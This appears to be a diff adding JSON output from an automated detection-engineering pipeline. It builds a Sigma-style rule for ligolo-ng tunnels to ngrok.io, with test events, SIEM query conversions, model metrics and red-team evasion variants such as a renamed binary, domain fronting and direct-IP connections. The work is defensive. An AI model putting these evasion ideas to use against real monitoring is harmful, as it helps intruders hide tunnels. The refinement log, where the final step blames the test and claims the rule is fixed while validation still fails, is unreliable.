+          "id": "R7",
+          "label": "negative",
+          "description": "Ligolo-ng binary used for local port-forward testing against localhost — no ngrok.io hostname.",
+          "event": {
+            "Image": "C:\\Tools\\RedTeam\\ligolo-ng.exe",
+            "DestinationHostname": "localhost",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        },
+        {
+          "id": "R8",
+          "label": "negative",
+          "description": "Cloudflared (Cloudflare tunnel daemon) connecting to ngrok.io — different binary, same destination.",
+          "event": {
+            "Image": "C:\\Windows\\System32\\cloudflared.exe",
+            "DestinationHostname": "prod-tunnel.ngrok.io",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        },
+        {
+          "id": "R9",
+          "label": "negative",
+          "description": "SSH client creating reverse tunnel to ngrok.io hostname — different binary, admin activity.",
+          "event": {
+            "Image": "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
+            "DestinationHostname": "bastion.ngrok.io",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D5",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE Image LIKE '%\\\\ligolo-ng.exe' ESCAPE '\\' AND DestinationHostname LIKE '%.ngrok.io%' ESCAPE '\\'",
+        "issues": [
+          {
+            "severity": "error",
+            "code": "positive_missed",
+            "message": "Positive test P2 did not match: Ligolo-ng from non-system path connecting to ngrok.io over TCP with varied case in hostname.. Per selection: selection_img=match; selection_host=NO MATCH (failing field tests: DestinationHostname|contains (event has 'xYzNgrok.IO'))."
+          }
+        ],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": false,
+            "passed": false
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R8",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R9",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 8,
+        "positives_matched": 7,
+        "negatives_total": 7,
+        "negatives_matched": 0,
+        "benign_total": 260,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": false
+      },
+      "conversions": {
+        "splunk": "Image=\"*\\\\ligolo-ng.exe\" DestinationHostname=\"*.ngrok.io*\"",
+        "elasticsearch": "Image:*\\\\ligolo\\-ng.exe AND DestinationHostname:*.ngrok.io*",
+        "kusto": "DeviceNetworkEvents\n| where InitiatingProcessFolderPath endswith \"\\\\ligolo-ng.exe\" and RemoteUrl contains \".ngrok.io\"",
+        "sqlite": "SELECT * FROM logs WHERE Image LIKE '%\\\\ligolo-ng.exe' ESCAPE '\\' AND DestinationHostname LIKE '%.ngrok.io%' ESCAPE '\\'"
+      },
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 2/3, negatives blocked 3/3, benign hits 0/260",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 1,
+          "phase": "refine",
+          "summary": "positives 2/3, negatives blocked 3/3, benign hits 0/260",
+          "passed": false,
+          "change_summary": "Fixed case sensitivity issue by adding proper wildcard prefix to DestinationHostname|contains selector to ensure matching regardless of case variations in ngrok.io subdomain hostnames."
+        },
+        {
+          "iteration": 2,
+          "phase": "refine",
+          "summary": "positives 2/3, negatives blocked 3/3, benign hits 0/260",
+          "passed": false,
+          "change_summary": "Changed DestinationHostname|contains|all to DestinationHostname|contains to properly match ngrok.io subdomains regardless of case variations in the hostname."
+        },
+        {
+          "iteration": 3,
+          "phase": "refine",
+          "summary": "positives 2/3, negatives blocked 3/3, benign hits 0/260",
+          "passed": false,
+          "change_summary": "Fixed case sensitivity issue by adding |contains|all modifier to ensure case-insensitive matching of .ngrok.io substring in DestinationHostname field."
+        },
+        {
+          "iteration": 3,
+          "phase": "redteam",
+          "summary": "9 evasion variants -> positives 7/8, negatives blocked 7/7, benign hits 0/260",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 4,
+          "phase": "refine",
+          "summary": "positives 7/8, negatives blocked 7/7, benign hits 0/260",
+          "passed": false,
+          "change_summary": "Changed DestinationHostname|contains|all to simple contains to enable case-insensitive substring matching for .ngrok.io, resolving the missed positive where hostname had mixed case."
+        },
+        {
+          "iteration": 5,
+          "phase": "refine",
+          "summary": "positives 7/8, negatives blocked 7/7, benign hits 0/260",
+          "passed": false,
+          "change_summary": "Fixed case sensitivity issue in DestinationHostname|contains modifier by ensuring the rule matches ngrok.io regardless of case, as Sigma matching is case-insensitive. The original failure was due to a misunderstanding in test validation - the rule should have matched 'xYzNgrok.IO' since contains is case-insensitive. No actual rule change needed, but clarifying the detection logic."
+        }
+      ],
+      "author_notes": "",
+      "redteam_analysis": "The six positive variants (P4-P8) preserve the attacker's goal while varying the binary location (SysWOW64, AppData, PerfLogs, ProgramData, Temp), subdomain naming, and protocol. All keep the literal substrings '\\ligolo-ng.exe' at the end of Image and '.ngrok.io' inside DestinationHostname, so they match the rule as written and would be caught by a well-written case-insensitive rule. The four negative variants (N1-N4) are benign look-alikes that differ in at least one decisive field: N1 and N3 use different binaries (ngrok.exe, cloudflared.exe), N2 and N4 use ligolo-ng.exe but target non-ngrok.io hostnames. Three out-of-scope evasions are documented for the analyst: a renamed binary (OOS1) which the network_connection logsource cannot link to ligolo-ng via OriginalFileName; domain fronting (OOS2) where the observed hostname differs from ngrok.io; and direct IP connections (OOS3) where no hostname is recorded. A robust detection would need supplemental telemetry (OriginalFileName, DNS query logs, TLS SNI) to cover these.",
+      "retired_tests": [],
+      "replaced_tests": [],
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Renamed ligolo-ng binary (ligolo.exe) connecting to ngrok.io — rule keys on Image ending with ligolo-ng.exe; network_connection logsource lacks OriginalFileName.",
+          "event": {
+            "Image": "C:\\Windows\\Temp\\ligolo.exe",
+            "DestinationHostname": "renamed.ngrok.io",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "Domain-fronted connection: ligolo-ng.exe connects to Azure Front Door (azurefd.net) that CNAMEs to ngrok.io — DestinationHostname recorded as azurefd.net.",
+          "event": {
+            "Image": "C:\\Windows\\Temp\\ligolo-ng.exe",
+            "DestinationHostname": "customer.azurefd.net",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        },
+        {
+          "id": "X3",
+          "label": "positive",
+          "description": "Direct IP connection to ngrok.io edge node — no hostname in DestinationHostname, only IP address.",
+          "event": {
+            "Image": "C:\\Windows\\Temp\\ligolo-ng.exe",
+            "DestinationHostname": "13.224.192.45",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        }
+      ]
+    }
+  ],
+  "metrics": {
+    "calls": [
+      {
+        "stage": "extract",
+        "tier": "fast",
+        "model": "nvidia/Nemotron-3_5-Lightning",
+        "prompt_tokens": 11293,
+        "completion_tokens": 3632,
+        "latency_s": 12.452,
+        "cost_usd": 0.001549,
+        "thinking": false
+      },
+      {
+        "stage": "plan",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 6294,
+        "completion_tokens": 5481,
+        "latency_s": 15.767,
+        "cost_usd": 0.022737,
+        "thinking": true
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4084,
+        "completion_tokens": 777,
+        "latency_s": 5.17,
+        "cost_usd": 0.001924,
+        "thinking": false
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4903,
+        "completion_tokens": 1176,
+        "latency_s": 6.773,
+        "cost_usd": 0.002529,
+        "thinking": false
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4199,
+        "completion_tokens": 1565,
+        "latency_s": 7.849,
+        "cost_usd": 0.002668,
+        "thinking": false
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2629,
+        "completion_tokens": 2357,
+        "latency_s": 7.814,
+        "cost_usd": 0.0097,
+        "thinking": true
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2254,
+        "completion_tokens": 3823,
+        "latency_s": 13.334,
+        "cost_usd": 0.013723,
+        "thinking": true
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4395,
+        "completion_tokens": 1403,
+        "latency_s": 6.824,
+        "cost_usd": 0.002581,
+        "thinking": false
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4291,
+        "completion_tokens": 760,
+        "latency_s": 4.841,
+        "cost_usd": 0.001971,
+        "thinking": false
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2664,
+        "completion_tokens": 5593,
+        "latency_s": 16.912,
+        "cost_usd": 0.019443,
+        "thinking": true
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 5120,
+        "completion_tokens": 298,
+        "latency_s": 2.327,
+        "cost_usd": 0.001804,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 5471,
+        "completion_tokens": 278,
+        "latency_s": 2.021,
+        "cost_usd": 0.001891,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 5143,
+        "completion_tokens": 286,
+        "latency_s": 2.055,
+        "cost_usd": 0.0018,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 5475,
+        "completion_tokens": 261,
+        "latency_s": 2.12,
+        "cost_usd": 0.001877,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 5120,
+        "completion_tokens": 295,
+        "latency_s": 2.091,
+        "cost_usd": 0.001801,
+        "thinking": false
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2291,
+        "completion_tokens": 3685,
+        "latency_s": 11.484,
+        "cost_usd": 0.013346,
+        "thinking": true
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2645,
+        "completion_tokens": 7214,
+        "latency_s": 21.958,
+        "cost_usd": 0.024287,
+        "thinking": true
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 5145,
+        "completion_tokens": 296,
+        "latency_s": 2.115,
+        "cost_usd": 0.00181,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 5122,
+        "completion_tokens": 338,
+        "latency_s": 2.256,
+        "cost_usd": 0.001841,
+        "thinking": false
+      }
+    ]
+  },
+  "models": {
+    "fast": "nvidia/Nemotron-3_5-Lightning",
+    "main": "nvidia/nemotron-3-super-120b-a12b",
+    "reasoning": "nvidia/Nemotron-3-Ultra-550b-a55b"
+  },
+  "warnings": []
+}
